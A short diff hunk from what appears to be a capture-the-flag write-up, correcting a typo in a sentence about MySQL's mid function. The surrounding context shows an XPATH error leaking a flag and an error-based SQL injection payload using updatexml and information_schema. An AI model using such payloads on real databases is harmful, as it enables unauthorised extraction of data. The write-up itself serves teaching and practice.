@@ -23,7 +23,7 @@ XPATH syntax error: '
 flahga123456789xxsxx012xxxxxxxx'
 ```
 
-Because of the length, we use mid function in MySQL to cut the rest of flag that are not fullt obtain.
+Because of the length, we use mid function in MySQL to cut the rest of flag that are not fully obtain.
 
 ```
 updatexml(0,concat(0xa,(select mid(table_name,20,25) from information_schema.tables limit 1)),0)
